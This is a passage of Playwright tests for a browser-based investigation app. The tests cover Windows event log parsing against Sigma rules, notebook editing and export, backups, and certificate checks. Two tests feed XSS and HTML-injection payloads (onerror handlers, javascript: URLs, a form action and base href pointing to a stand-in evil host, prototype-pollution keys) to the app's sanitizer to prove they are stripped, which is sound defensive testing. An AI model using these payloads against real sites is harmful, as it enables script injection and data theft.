        if (r === 'welcome') return showWelcome();
        if (r === 'nb-page' || r === 'nb-export'){ closeDlg(); UI.nbPage = DB.nb.pages.find(p => p.title === 'Kerberoasting').id; UI.nbView = 'page'; location.hash = '#/notebook'; setTimeout(() => { renderMain(); if (r === 'nb-export') nbExportDlg('page', UI.nbPage); }, 30); return; }
        if (r === '#/notebook'){ closeDlg(); UI.nbView = 'lib'; }
        if (r.startsWith('cx-')){ closeDlg(); location.hash = '#/certs'; setTimeout(() => { renderMain(); const t = r.slice(3); if (t === 'guide') CX_ACTS.cxCh(null, 'inside'); else CX_ACTS.cxSample(null, t === 'dec' ? 'phish' : t); }, 30); return; }
        if (r.startsWith('ctf-')) { location.hash = '#/ctf'; UI.ctfTab = r === 'ctf-ws' ? 'board' : r === 'ctf-cheats' ? 'cheats' : 'writeups'; UI.ctfSel = r === 'ctf-ws' ? DB.ctf.chals[0].id : null; setTimeout(renderMain, 30); return; }
        location.hash = r; }, r);
      await page.waitForTimeout(450);
      const res = await new AxeBuilder({ page }).withTags(['wcag2a', 'wcag2aa', 'wcag21a', 'wcag21aa']).analyze();
      for (const v of res.violations) if (['serious', 'critical'].includes(v.impact)) for (const n of v.nodes.slice(0, 3)) found.push(`${theme} ${r} ${v.id}: ${n.target.join(' ')}`);
    }
  }
  expect(found, found.join('\n')).toEqual([]);
  noErrors(errors.filter(e => !/Connecting to 'file:.*violates the following Content Security Policy directive: "connect-src/.test(e)));   // axe reads the stylesheets; the app's CSP rightly blocks that
});

test('Windows event logs (.evtx) are read, checked against Sigma rules and imported', async ({ page }) => {
  test.setTimeout(120_000);
  const errors = await open(page, '#/case/c-lantern/timeline');
  // the reader on its own: a synthetic Security log spread over several chunks (tests/fixtures/make_evtx.py)
  const sec = await page.evaluate(async b64 => { const u = Uint8Array.from(atob(b64), c => c.charCodeAt(0)); const r = EVTX.parse(u.buffer);
    return { n: r.events.length, chunks: r.chunks, bad: r.badRecords, add: r.events.find(x => x.EventID === '4732'), clr: r.events.find(x => x.EventID === '1102'), fail: r.events.filter(x => x.EventID === '4625').length }; },
    require('fs').readFileSync(fixture('security-sample.evtx')).toString('base64'));
  expect(sec).toMatchObject({ n: 321, bad: 0, fail: 12 }); expect(sec.chunks).toBeGreaterThan(1);
  expect(sec.add).toMatchObject({ Channel: 'Security', Computer: 'WS-FIN-07.corp.example', TargetUserName: 'Administrators', MemberSid: 'S-1-5-21-1234567890-2345678901-3456789012-1001', TimeCreated: '2026-09-14T08:47:52.000Z' });
  expect(sec.clr).toMatchObject({ UserDataType: 'LogFileCleared', SubjectUserName: 'svc_backup' });
  // the whole flow with a synthetic Sysmon log
  await page.evaluate(() => openCapture());
  const [chooser] = await Promise.all([page.waitForEvent('filechooser'), page.click('[data-act=capLog]')]);
  await chooser.setFiles(fixture('sysmon-sample.evtx'));
  await expect(page.locator('[data-act=evtxGo]:not([disabled])')).toBeVisible({ timeout: 60_000 });
  await expect(page.locator('#evtxDlg')).toContainText('22');
  const sig = await page.evaluate(() => Object.fromEntries(EVTXIMP.sig.per.map(([r, n]) => [r.title, n])));
  expect(sig['Certutil Used to Download a File']).toBe(1);
  expect(sig['Registry Run Key Persistence']).toBe(1);
  expect(sig['LSASS Credential Dump Attempt']).toBe(1);                     // the dumper, not Windows or the antivirus reading LSASS
  expect(sig['Remote Thread Created in LSASS']).toBeUndefined();            // log sources are respected: process access is not a remote thread
  await page.click('[data-act=evtxGo]');
  await expect.poll(() => page.evaluate(() => DB.records.filter(r => (r.tags || []).includes('evtx')).length)).toBe(22);
  const rec = await page.evaluate(() => { const r = DB.records.find(x => (x.tags || []).includes('evtx') && /certutil/.test(x.body) && /EventID=1 /.test(x.body)); return { title: r.title, host: r.host, ts: r.ts, det: (r.det || []).map(d => d.title) }; });
  expect(rec.title).toMatch(/^1 · Process created/); expect(rec.host).toBe('WS-FIN-07.corp.example'); expect(rec.ts).toBe(Date.parse('2026-09-14T08:57:40Z'));
  expect(rec.det).toContain('Certutil Used to Download a File');
  await expect(page.locator('.ev .evdet').first()).toBeVisible();
  noErrors(errors);
});

test('an improved built-in rule replaces an unedited old copy, but never one you edited', async ({ page }) => {
  const errors = await open(page, '#/detections');
  const r = await page.evaluate(() => {
    const seed = RULE_SEED.find(x => x.id === 'sig-2026-cred-010'), old = seed.replaces[0];
    DB.rules = DB.rules.filter(x => x.id !== 'sig-2026-cred-010' && x.id !== 'pk-sig-001');
    DB.rules.push({ ...ruleFromSeed(seed), code: old });                                                  // an old, unedited copy
    const mine = { ...ruleFromSeed(RULE_PACK[0]), code: 'my own edit' }; DB.rules.push(mine);             // an edited copy (no replaces entry matches)
    RULES_MERGED = false; ensureRules();
    return { upgraded: DB.rules.find(x => x.id === 'sig-2026-cred-010').code.includes('filter_system'), kept: DB.rules.find(x => x.id === 'pk-sig-001').code };
  });
  expect(r.upgraded).toBe(true); expect(r.kept).toBe('my own edit');
  noErrors(errors);
});

test('notebook: write, paste a picture, flashcards, review, export to Word and Markdown, import back', async ({ page }) => {
  const fs = require('fs');
  const errors = await open(page, '#/notebook');
  await expect(page.locator('.nbk')).toHaveCount(3);
  await page.evaluate(() => NB_ACTS.nbPageNew(DB.nb.sections.find(s => s.name === 'Kerberos attacks').id));
  await page.keyboard.type('Delegation abuse'); await page.keyboard.press('Enter');
  await page.keyboard.type('## Unconstrained'); await page.keyboard.press('Enter');
  await page.keyboard.type('- first'); await page.keyboard.press('Enter'); await page.keyboard.type('second'); await page.keyboard.press('Enter'); await page.keyboard.press('Enter');
  await page.keyboard.type('``` '); await page.keyboard.type('Get-ADComputer -Filter *'); await page.keyboard.press('Enter'); await page.keyboard.type('next line'); await page.keyboard.press('Enter'); await page.keyboard.press('Enter');
  await page.keyboard.type('Q: What does unconstrained delegation store?'); await page.keyboard.press('Enter'); await page.keyboard.type('A: The TGTs of users who connect.');
  await page.evaluate(() => { const bin = Uint8Array.from(atob(NB_DEMO_SHOT.data.split(',')[1]), c => c.charCodeAt(0)), dt = new DataTransfer(); dt.items.add(new File([bin], 'shot.png', { type: 'image/png' }));
    $('nbEd').dispatchEvent(new ClipboardEvent('paste', { clipboardData: dt, bubbles: true, cancelable: true })); });
  await page.waitForTimeout(300);
  await page.evaluate(() => { const dt = new DataTransfer(); dt.setData('text/html', '<p><span style="font-weight:700">Bold</span> <a href="javascript:alert(1)">bad</a><img src=x onerror=alert(1)><script>alert(1)</script></p>'); dt.setData('text/plain', 'x');
    $('nbEd').dispatchEvent(new ClipboardEvent('paste', { clipboardData: dt, bubbles: true, cancelable: true })); });
  await page.waitForTimeout(900);
  const pg = await page.evaluate(() => { const p = nbPage(UI.nbPage); return { title: p.title, html: p.html, cards: nbInfo(p).cards.length, imgs: nbInfo(p).imgs.length }; });
  expect(pg.title).toBe('Delegation abuse');
  expect(pg.html).toContain('<h3>Unconstrained</h3>'); expect(pg.html).toContain('<li>first</li><li>second</li>'); expect(pg.html).toContain('<pre>Get-ADComputer -Filter *\nnext line</pre>');
  expect(pg.html).toContain('<b>Bold</b>'); expect(pg.html).not.toMatch(/javascript:|onerror|<script/);
  expect(pg.cards).toBe(1); expect(pg.imgs).toBe(1);
  await expect(page.locator('#nbSide')).toContainText('What does unconstrained delegation store?');
  // review from the library: reveal, rate Good
  await page.click('[data-act=nbLib]');
  await page.keyboard.press('Space'); await page.keyboard.press('3');
  expect(await page.evaluate(() => Object.values(DB.nb.cards).filter(c => c.reps > 0).length)).toBeGreaterThan(0);
  // Word export: a real .docx with the picture inside
  await page.evaluate(() => nbOpen(DB.nb.pages.find(p => p.title === 'Kerberoasting').id));
  await page.click('.nbbar [data-act=nbExport]');
  const [dl] = await Promise.all([page.waitForEvent('download'), page.click('[data-act=nbxGo]')]);
  expect(dl.suggestedFilename()).toBe('kerberoasting.docx');
  const file = await dl.path(), bytes = fs.readFileSync(file), txt = bytes.toString('latin1');
  expect(bytes.slice(0, 2).toString()).toBe('PK');
  for (const part of ['[Content_Types].xml', 'word/document.xml', 'word/styles.xml', 'word/numbering.xml', 'word/media/image1.png']) expect(txt).toContain(part);
  expect(txt).toContain('Request the tickets'); expect(txt).toContain('w:pStyle w:val="Heading1"');
  // Markdown export of the section: a zip with one .md per page and the picture
  await page.click('.nbbar [data-act=nbExport]'); await page.click('[data-act=nbxScope][data-v=sec]'); await page.click('[data-act=nbxFmt][data-v=md]');
  const [md] = await Promise.all([page.waitForEvent('download'), page.click('[data-act=nbxGo]')]);
  const mtxt = fs.readFileSync(await md.path()).toString('utf8');
  expect(md.suggestedFilename()).toBe('kerberos-attacks-markdown.zip'); expect(mtxt).toContain('kerberos-attacks/kerberoasting.md'); expect(mtxt).toContain('## Request the tickets'); expect(mtxt).toContain('| 13100 |');
  // the Word file imports back as a page with its picture and flashcards
  const back = await page.evaluate(async b64 => { const r = await nbFromDocx(Uint8Array.from(atob(b64), c => c.charCodeAt(0))); return { title: r.title, img: /<img data-m=/.test(r.html), q: (r.html.match(/<p>Q: /g) || []).length }; }, bytes.toString('base64'));
  expect(back).toEqual({ title: 'Kerberoasting', img: true, q: 3 });
  // reload keeps everything
  await page.reload(); await expect.poll(() => page.evaluate(() => !!DB && !!DB.nb && DB.nb.pages.some(p => p.title === 'Delegation abuse'))).toBe(true);
  noErrors(errors);
});

test('notebook cleaning: hostile HTML never survives, and nothing runs', async ({ page }) => {
  const errors = await open(page, '#/notebook');
  const V = ['<img src=x onerror=window.__x=1>', '<svg onload=window.__x=1>', '<script>window.__x=1</script>', '<a href=" JaVaScRiPt:window.__x=1">a</a>', '<a href="java&#x09;script:x">a</a>',
    '<a href="data:text/html,<script>1</script>">a</a>', '<iframe src="javascript:x"></iframe>', '<math><mtext><table><mglyph><style><img src=x onerror=window.__x=1>', '<noscript><p title="</noscript><img src=x onerror=window.__x=1>">',
    '<p style="background:url(http://evil)">x</p>', '<form action="http://evil"><input></form>', '<div class="nb-link"><a href="javascript:alert(1)">x</a></div>', '<img data-m="__proto__">',
    '<img data-m="constructor" src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">', '<ul class="nb-check evil"><li class="done x" onclick=x>t</li></ul>', '<base href="http://evil/">', '<details open ontoggle=window.__x=1>', '<p>' + '<b>'.repeat(3000) + 'deep</p>'];
  const bad = await page.evaluate(V => { const out = [];
    for (const v of V) { const d = document.createElement('div'); d.innerHTML = nbClean(v, { src: true, media: true });
      for (const el of d.querySelectorAll('*')) { if (!/^(P|H2|H3|H4|B|I|U|S|MARK|CODE|SUB|SUP|PRE|UL|OL|LI|A|BR|HR|BLOCKQUOTE|TABLE|TR|TH|TD|FIGURE|FIGCAPTION|IMG|DIV|SMALL|TBODY)$/.test(el.tagName)) out.push(v + ' tag ' + el.tagName);
        for (const a of el.attributes) { if (/^on|^style$/i.test(a.name)) out.push(v + ' ' + a.name); if (a.name === 'href' && !/^(https?:|mailto:)/i.test(a.value)) out.push(v + ' href'); if (a.name === 'src' && !/^(data:image\/(png|jpeg|gif|webp);base64,|blob:)/.test(a.value)) out.push(v + ' src');
          if (a.name === 'class' && !['nb-link', 'nb-call', 'nb-check', 'done'].includes(a.value)) out.push(v + ' class'); } } }
    const pg = nbNewPage(DB.nb.sections[0].id, { html: nbClean(V.join('')) }); nbOpen(pg.id, { full: true }); return out; }, V);
  await page.waitForTimeout(500);
  expect(bad).toEqual([]); expect(await page.evaluate(() => window.__x)).toBeUndefined();
  // a backup with hostile notebook data is cleaned on import
  const clean = await page.evaluate(() => { const prev = DB.nb; DB.nb = { books: [{ id: 'nb-x', name: '<b>x</b>'.repeat(50), color: 'red;background:url(http://evil)', kind: 'Hack' }], sections: [{ id: 'ns-x', bookId: 'nb-x', name: 'S' }, { id: 'ns-y', bookId: 'nope' }],
      pages: [{ id: 'pg-x', sectionId: 'ns-x', title: 7, html: '<img src=x onerror=alert(1)><p>ok</p>', tags: ['a', 5, {}], att: ['m-none'] }], media: { '__proto__': {}, 'm-ok': { type: 'image/png', name: 'a', data: 'javascript:1' } }, cards: { 'bad key': {} } };
    nbSanitize(); const r = JSON.parse(JSON.stringify(DB.nb)); DB.nb = prev; return r; });
  expect(clean.books[0].color).toMatch(/^#/); expect(clean.books[0].name.length).toBeLessThanOrEqual(120); expect(clean.books[0].kind).toBe('Other');
  expect(clean.sections.length).toBe(1); expect(clean.pages[0].html).toBe('<p>ok</p>'); expect(clean.pages[0].title).toBe('Untitled'); expect(clean.pages[0].tags).toEqual(['a']); expect(clean.pages[0].att).toEqual([]);
  expect(Object.keys(clean.media)).toEqual(['m-ok']); expect(clean.media['m-ok'].data).toBeUndefined(); expect(clean.cards).toEqual({});
  noErrors(errors);
});

test('notebook pictures live outside the save, survive closing the tab, and travel in backups', async ({ page: first, context }) => {
  const fs = require('fs');
  const errors = await open(first, '#/notebook'); let page = first;
  await page.evaluate(() => NB_ACTS.nbPageNew(DB.nb.sections[0].id)); await page.keyboard.press('Enter');
  await page.evaluate(() => { const bin = Uint8Array.from(atob(NB_DEMO_SHOT.data.split(',')[1]), c => c.charCodeAt(0)), dt = new DataTransfer(); dt.items.add(new File([bin], 'lab.png', { type: 'image/png' }));
    $('nbEd').dispatchEvent(new ClipboardEvent('paste', { clipboardData: dt, bubbles: true, cancelable: true })); });
  await expect(page.locator('#nbEd img[src^="blob:"]')).toHaveCount(1);
  // close the tab straight after typing, then open the app again (the test helper's start-up script would race a plain reload)
  await page.keyboard.type('typed just before closing'); await page.close({ runBeforeUnload: true });
  page = await context.newPage(); page.on('pageerror', e => errors.push('pageerror: ' + e.message)); await page.goto(APP + '#/notebook');
  await expect.poll(() => page.evaluate(() => typeof DB !== 'undefined' && !!DB && !!DB.nb && DB.nb.pages.some(p => p.html.includes('typed just before closing'))), { timeout: 15000 }).toBe(true);
  await page.evaluate(() => { if (typeof closeWelcome === 'function') closeWelcome(); });
  const st = await page.evaluate(async () => { const m = Object.values(DB.nb.media).find(x => x.name === 'lab.png'); return { inline: !!m.data, stored: !!(await IDB.get('nbm:' + m.id)), inSave: JSON.stringify(DB).includes('iVBOR') }; });
  expect(st).toEqual({ inline: false, stored: true, inSave: false });
  const [dl] = await Promise.all([page.waitForEvent('download'), page.evaluate(() => exportEverything(false))]);
  const bk = JSON.parse(fs.readFileSync(await dl.path(), 'utf8')); expect(Object.keys(bk.nbfiles).length).toBe(1);
  await page.evaluate(async () => { for (const k of Object.keys(DB.nb.media)) await IDB.del('nbm:' + k); });
  await page.evaluate(() => { if (typeof closeWelcome === 'function') closeWelcome(); });   // the welcome screen can open late on a fresh tab and cover the dialog
  const [fc] = await Promise.all([page.waitForEvent('filechooser'), page.evaluate(() => clickAct('importAll'))]); await fc.setFiles(await dl.path());
  await page.click('[data-act=confirmOk]');
  await expect.poll(() => page.evaluate(async () => { const m = Object.values(DB.nb.media).find(x => x.name === 'lab.png'); return !!(m && await IDB.get('nbm:' + m.id)); })).toBe(true);
  noErrors(errors);
});

test('storage: real usage, early warnings, refusing files that do not fit, and clean-up', async ({ page }) => {
  const errors = await open(page, '#/settings');
  await expect(page.locator('#storage .sto-t')).toBeVisible();
  await page.evaluate(async () => { await IDB.set('file:f-orphan', new Blob(['x'])); await IDB.set('nbm:m-orphan', new Blob(['y'])); await storageRefresh(); });
  await expect(page.locator('#storage')).toContainText('Leftover files nothing uses (2)');
  await page.click('[data-act=stoOrphans]'); await page.click('[data-act=confirmOk]');
  await expect.poll(() => page.evaluate(async () => (await IDB.keys()).filter(k => /orphan/.test(k)).length)).toBe(0);
  await page.evaluate(async () => { storageEstimate = async () => { STORE.quota = 500e6; STORE.usage = 450e6; return STORE; }; await storageCheck(); });
  await expect(page.locator('#saved')).toContainText('Storage 90% full');
  expect(await page.evaluate(() => nbRoomFor(80e6))).toBe(false);
  await page.evaluate(() => { storageOK = false; paintSaved(); }); await expect(page.locator('#saved')).toContainText('Not saved');
  noErrors(errors);
});

test('a large workspace keeps the last typing when the tab closes (journal)', async ({ page: first, context }) => {
  const errors = await open(first, '#/notebook'); let page = first;
  await page.evaluate(() => { const h = DB.nb.pages[2].html; for (let i = 0; i < 900; i++) nbNewPage(DB.nb.sections[0].id, { title: 'P' + i, html: h }); flush(); });
  await expect.poll(() => page.evaluate(() => STORE.ls)).toBe(false);          // too big for the instant localStorage copy
  await page.evaluate(() => NB_ACTS.nbPageNew(DB.nb.sections[0].id)); await page.keyboard.press('Enter');
  await page.keyboard.type('last words before closing'); await page.close({ runBeforeUnload: true });
  page = await context.newPage(); page.on('pageerror', e => errors.push('pageerror: ' + e.message)); await page.goto(APP + '#/notebook');
  await expect.poll(() => page.evaluate(() => typeof DB !== 'undefined' && !!DB && !!DB.nb && DB.nb.pages.some(p => p.html.includes('last words before closing'))), { timeout: 15000 }).toBe(true);
  noErrors(errors);
});

test('leaving with a change not yet on disk asks first; a saved workspace never asks', async ({ page: first, context }) => {
  const errors = await open(first, '#/notebook'); let page = first;
  await page.evaluate(() => encEnable('correct horse battery staple 9')); await page.waitForTimeout(1200);   // encrypted saves finish in the background
  await page.evaluate(() => NB_ACTS.nbPageNew(DB.nb.sections[0].id)); await page.keyboard.press('Enter'); await page.keyboard.type('encrypted words');
  let asked = false; page.on('dialog', async d => { asked = d.type() === 'beforeunload'; await d.dismiss(); });
  await page.close({ runBeforeUnload: true });
  await expect.poll(() => asked).toBe(true);
  await expect.poll(() => page.evaluate(() => isDirty())).toBe(false);                       // the save finished while the browser asked
  await expect(page.locator('#saved')).toContainText('Saved');
  expect(await page.evaluate(() => DB.nb.pages.some(p => p.html.includes('encrypted words')))).toBe(true);
  // nothing pending: closing does not ask
  page.removeAllListeners('dialog'); let again = false; page.on('dialog', d => { again = true; d.accept(); });
  await page.close({ runBeforeUnload: true }); await new Promise(r => setTimeout(r, 400)); expect(again).toBe(false);
  noErrors(errors);
});

test('automatic backup to a folder: writes, keeps 7 days, pauses without permission, encrypts, restores', async ({ page }) => {
  const errors = await open(page, '#/settings');
  // a stand-in folder (headless browsers cannot show the real picker)
  await page.evaluate(() => {
    const files = new Map(); let perm = 'granted';
    const dir = { kind: 'directory', name: 'OSINTrix backups', files, setPerm: p => perm = p,
      queryPermission: async () => perm, requestPermission: async () => perm,
      getFileHandle: async (n, o) => { if (!files.has(n) && !(o && o.create)) throw new DOMException('no', 'NotFoundError'); if (perm !== 'granted') throw new DOMException('no', 'NotAllowedError');
        return { kind: 'file', createWritable: async () => { let buf = ''; return { write: async t => { buf += t; }, close: async () => { files.set(n, buf); } }; } }; },
      entries: async function* () { for (const k of files.keys()) yield [k, { kind: 'file' }]; },
      removeEntry: async n => { files.delete(n); } };
    window.__dir = dir; window.showDirectoryPicker = async () => dir;
    for (let i = 1; i <= 9; i++) files.set('osintrix-2020-01-0' + i + '.json', '{}');   // old daily copies
    files.set('my-notes.txt', 'not ours');
  });
  await expect(page.locator('#storage')).toContainText('Automatic backup to a folder');
  await page.click('[data-act=fbChoose]');
  await expect(page.locator('#storage .fb-st')).toContainText('On');
  const names = await page.evaluate(() => [...__dir.files.keys()].sort());
  expect(names).toContain('osintrix-latest.json'); expect(names).toContain('my-notes.txt');
  expect(names.filter(n => /^osintrix-\d{4}-\d{2}-\d{2}\.json$/.test(n)).length).toBe(7);           // today + the 6 newest old ones
  const latest = await page.evaluate(() => JSON.parse(__dir.files.get('osintrix-latest.json')));
  expect(latest.cases.length).toBeGreaterThan(0); expect(latest.nb.pages.length).toBeGreaterThan(0);
  // a change is backed up automatically
  await page.evaluate(() => { const p = fbGet(); p.every = 0; fbSet(p); DB.notes.push({ id: uid('n'), text: 'after the first backup', created: Date.now() }); mutate('note'); });
  await expect.poll(() => page.evaluate(() => (__dir.files.get('osintrix-latest.json') || '').includes('after the first backup')), { timeout: 20000 }).toBe(true);
  // permission withdrawn: paused, and Resume brings it back
  await page.evaluate(async () => { __dir.setPerm('prompt'); DB.notes.push({ id: uid('n'), text: 'while paused', created: Date.now() }); mutate('note'); await fbRun(true); });
  await expect(page.locator('#storage .fb-st')).toContainText('Paused');
  await page.evaluate(() => __dir.setPerm('granted')); await page.click('[data-act=fbResume]');
  await expect.poll(() => page.evaluate(() => (__dir.files.get('osintrix-latest.json') || '').includes('while paused'))).toBe(true);
  // encrypted workspace: the backup is encrypted and opens with the passphrase
  await page.evaluate(async () => { await encEnable('correct horse battery staple 9'); await fbRun(true); });
  const env = await page.evaluate(() => JSON.parse(__dir.files.get('osintrix-latest.json')));
  expect(env.enc).toBeTruthy(); expect(JSON.stringify(env)).not.toContain('while paused');
  const back = await page.evaluate(async () => { const d = JSON.parse(__dir.files.get('osintrix-latest.json')); const key = await deriveKey('correct horse battery staple 9', b64d8(d.kdf.salt), d.kdf.iter); return JSON.parse(await openWith(key, d)).notes.some(n => n.text === 'while paused'); });
  expect(back).toBe(true);
  await page.click('[data-act=fbOff]'); await expect(page.locator('#storage [data-act=fbChoose]')).toBeVisible();
  noErrors(errors);
});

test('trash: items past 30 days are cleared before the sidebar counts them', async ({ page }) => {
  const errors = await open(page, '#/home');
  const r = await page.evaluate(() => { trashPut('note', 'expired', { n: { id: 'nx1' } }); trashPut('note', 'fresh', { n: { id: 'nx2' } }); DB.trash.find(x => x.label === 'expired').at = Date.now() - 40 * 864e5; renderNav();
    return { count: document.querySelector('a.nv[href="#/trash"] .cnt').textContent, left: DB.trash.map(x => x.label) }; });
  expect(r).toEqual({ count: '1', left: ['fresh'] });
  noErrors(errors);
});

test('what\'s new: filters and search repaint only the timeline, matches are marked, releases can be jumped to', async ({ page }) => {
  const errors = await open(page, '#/whatsnew');
  await page.evaluate(() => { document.querySelector('.wn2-hero').dataset.keep = '1'; });
  await page.click('.wn2-f.fix'); await expect(page.locator('.wn2-g h3')).toHaveCount(await page.locator('.wn2-v').count());
  await expect(page.locator('.wn2-g h3').first()).toContainText('Fixed');
  await page.fill('#wnQ', 'certificate');
  await expect(page.locator('.wn2-res')).toContainText('for “certificate”'); await expect(page.locator('.wn2-tl mark').first()).toBeVisible();
  await page.click('[data-act=wnClear]'); await expect(page.locator('#wnQ')).toHaveValue('');
  await page.click('.wn2-ni:has-text("v1.10")'); await expect(page.locator('#v1\\.10 .wn2-gs')).toBeVisible();
  expect(await page.evaluate(() => document.querySelector('.wn2-hero').dataset.keep)).toBe('1');   // the header was never redrawn
  noErrors(errors);
});

test('cases: board cards by default, a list view that is remembered, search, sort and status filters', async ({ page }) => {
  const errors = await open(page, '#/cases');
  await expect(page.locator('.cs2-card')).toHaveCount(3);
  await expect(page.locator('.cs2-card:has-text("Op Lantern") .cs2-map .nd.m').first()).toBeVisible();   // its own graph, malicious nodes marked
  await expect(page.locator('.cs2-card:has-text("Op Lantern") .cs2-ov .r')).toContainText('malicious');
  await page.fill('#cs2Q', 'portal'); await expect(page.locator('.cs2-card')).toHaveCount(1);
  await page.fill('#cs2Q', 'zzzz'); await expect(page.locator('.cs2-empty')).toBeVisible();
  await page.click('[data-act=caseFindClear]'); await expect(page.locator('.cs2-card')).toHaveCount(3);
  await page.click('[data-act=casesView][data-v=ledger]');
  await expect(page.locator('.cs2-r')).toHaveCount(3); await expect(page.locator('.cs2-card')).toHaveCount(0);
  await page.selectOption('#cs2Sort', 'name');
  await expect(page.locator('.cs2-r b').first()).toContainText('Harbour photo');             // sorted by name inside each status group
  await page.click('[data-act=cf][data-v=review]'); await expect(page.locator('.cs2-r')).toHaveCount(1);
  await page.click('[data-act=cf][data-v=all]');
  await page.click('.cs2-r:has-text("Op Lantern") [data-act=casePin]');
  await expect(page.locator('.cs2-g').first()).toContainText('Pinned');
  await expect.poll(() => page.evaluate(() => (localStorage.getItem(STORE_KEY) || '').includes('"casesView":"ledger"'))).toBe(true);
  await page.reload(); await page.evaluate(() => { if (typeof closeWelcome === 'function') closeWelcome(); });
  await expect(page.locator('.cs2-r')).toHaveCount(3);                                   // the list view was remembered
  await page.click('.cs2-r:has-text("Customer portal") .case-hit'); await expect(page).toHaveURL(/#\/case\//);
  noErrors(errors);
});

test('text size: every font follows one scale, and the setting changes it everywhere', async ({ page }) => {
  const errors = await open(page, '#/home');
  const px = () => page.evaluate(() => [parseFloat(getComputedStyle(document.querySelector('.side .nv')).fontSize), parseFloat(getComputedStyle(document.querySelector('.ph h1, h1')).fontSize)]);
  const m = await px();
  await page.evaluate(() => { DB.prefs.size = 'l'; applyPrefs(); }); const l = await px();
  await page.evaluate(() => { DB.prefs.size = 's'; applyPrefs(); }); const sm = await px();
  expect(l[0]).toBeGreaterThan(m[0]); expect(sm[0]).toBeLessThan(m[0]); expect(l[1]).toBeGreaterThan(m[1]);
  expect(m[0]).toBeGreaterThanOrEqual(14);   // a little bigger than before by default
  await page.evaluate(() => { DB.prefs.size = 'm'; applyPrefs(); });
  noErrors(errors);
});

const pasteCert = async (page, text) => { await page.click('.crt-inb [data-act=cxPaste]'); await page.fill('#cxPdIn', text); await page.click('[data-act=cxPdGo]'); };

test('certificates: decode, findings, chain, CSR, private keys refused, save to case, notebook cards', async ({ page }) => {
  const fs = require('fs'), path = require('path'), D = path.join(__dirname, 'fixtures', 'certs');
  const errors = await open(page, '#/certs');
  // a phishing-style leaf with its issuer, pasted as PEM
  await pasteCert(page, fs.readFileSync(path.join(D, 'chain-phish.pem'), 'utf8'));
  await expect(page.locator('.crt-hero h1')).toHaveText('secure-acme-login.com');
  await expect(page.locator('.crt-r')).toContainText('Lookalike name');
  await expect(page.locator('.crt-chips .chip.hl')).toHaveText(/acme-sso\.microsoftonline-auth\.com/);
  await expect(page.locator('.crt-fp code').first()).toContainText(':');
  const fp = await page.evaluate(() => cxS().R.certs.find(c => c.title === 'secure-acme-login.com').fp.sha256);
  const want = require('crypto').createHash('sha256').update(fs.readFileSync(path.join(D, 'leaf-phish.der'))).digest('hex');
  expect(fp).toBe(want);
  // the chain is ordered and each signature checked; the missing root is named
  await page.click('[data-act=cxTab][data-v=chain]');
  await expect(page.locator('.crt-lnk.ok')).toHaveCount(1); await expect(page.locator('.crt-lnk.warn')).toContainText('Example Root CA X1');
  // a .p7b bundle opened as a file: full chain, all signatures good
  const [fc] = await Promise.all([page.waitForEvent('filechooser'), page.click('[data-act=cxFile]')]); await fc.setFiles(path.join(D, 'bundle.p7b'));
  await expect(page.locator('.crt-lnk.ok')).toHaveCount(3);
  // tampering is caught
  await page.evaluate(() => { const leaf = cxS().R.chain.order[0], b = new Uint8Array(leaf.der); b[b.length - 300] ^= 1; cxLoad(b); });
  await page.evaluate(() => { const R = cxS().R; R.certs.push(...X5.read(CERT_SAMPLES.ov.pem).certs.slice(1)); return cxEnrich(R); });
  await page.click('[data-act=cxTab][data-v=chain]'); await expect(page.locator('.crt-lnk.bad')).toHaveCount(1);
  // CSR: signature, challenge password, matching a certificate key
  await page.evaluate(() => CX_ACTS.cxSample(null, 'csr'));
  await expect(page.locator('.crt-csr')).toContainText('Signature is valid'); await expect(page.locator('.crt-csr')).toContainText('Contains a challenge password');
  // private keys are refused and removed from the box
  await pasteCert(page, fs.readFileSync(path.join(D, 'private-key.pem'), 'utf8'));
  await expect(page.locator('.crt-key')).toContainText('private key'); const keyLine = fs.readFileSync(path.join(D, 'private-key.pem'), 'utf8').split('\n')[1]; expect(await page.evaluate(k => JSON.stringify(DB).includes(k) || JSON.stringify(cxS().input || '').includes(k), keyLine)).toBe(false);
  // Cobalt Strike default, AD CS logon certificate
  await page.evaluate(() => CX_ACTS.cxSample(null, 'cs')); await expect(page.locator('.crt-r')).toContainText('Cobalt Strike default certificate');
  await page.evaluate(() => CX_ACTS.cxSample(null, 'adcs')); await expect(page.locator('.crt-r')).toContainText('Can log on to Windows as j.okafor@corp.example');
  // save to the case: an evidence record whose names and fingerprints are entities, reopened from the list
  await page.evaluate(() => CX_ACTS.cxSample(null, 'phish')); await expect(page.locator('.crt-fp code').first()).toContainText(':');
  await page.click('.crt-hero [data-act=cxSave]');
  const rec = await page.evaluate(() => { const r = DB.records.find(x => x.source === 'certificate'); return r && { title: r.title, ents: JSON.stringify(r.ents), ts: r.ts }; });
  expect(rec.title).toBe('Certificate: secure-acme-login.com'); expect(rec.ents).toContain('files-acme.net'); expect(rec.ents).toContain(fp); expect(rec.ts).toBeGreaterThan(0);
  await page.evaluate(() => { cxS().R = null; cxPaint(); }); await page.click('[data-act=cxSaved]'); await page.click('.rc [data-act=cxHistRec]:has-text("secure-acme-login.com")'); await expect(page.locator('.crt-hero h1')).toHaveText('secure-acme-login.com');
  // guide flashcards into the Notebook
  await page.evaluate(() => CX_ACTS.cxCh(null, 'chain')); await page.click('[data-act=cxToNb]');
  expect(await page.evaluate(() => { const b = DB.nb.books.find(x => x.name === 'Certificates'), p = DB.nb.pages.find(x => x.title === 'Chain of trust'); return !!b && nbInfo(p).cards.length; })).toBe(4);
  noErrors(errors);
});

test('certificates, advanced: signed programs, host and date checks, hunting, exports, key reuse, compare, transparency logs, paste and drop anywhere', async ({ page }) => {
  const fs = require('fs'), path = require('path'), crypto = require('crypto'), D = path.join(__dirname, 'fixtures', 'certs');
  const errors = await open(page, '#/certs');
  // a signed Windows program: the file still matches its Authenticode hash, the signer's key made the signature
  let [fc] = await Promise.all([page.waitForEvent('filechooser'), page.click('[data-act=cxFile]')]); await fc.setFiles(path.join(D, 'signed.exe'));
  await expect(page.locator('.crt-pe')).toContainText('The file is unchanged since it was signed');
  await expect(page.locator('.crt-pe')).toContainText('Signed with the publisher certificate’s key');
  await expect(page.locator('.crt-pe')).toContainText('Fabrikam Updater'); await expect(page.locator('.crt-hero h1')).toHaveText('Fabrikam Tools Ltd');
  expect(await page.evaluate(() => cxS().R.pe.sha256)).toBe(crypto.createHash('sha256').update(fs.readFileSync(path.join(D, 'signed.exe'))).digest('hex'));
  await page.click('.crt-pe [data-act=cxSave]');
